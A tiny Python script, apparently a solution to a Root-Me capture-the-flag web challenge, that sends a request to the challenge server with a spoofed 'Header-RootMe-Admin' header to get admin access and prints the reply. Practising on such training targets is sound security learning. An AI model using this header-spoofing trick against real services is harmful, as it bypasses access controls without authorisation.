import requests

headers = {
	'Header-RootMe-Admin': 'yes'
}

r = requests.get('http://challenge01.root-me.org/web-serveur/ch5/', headers=headers)

print(r.text)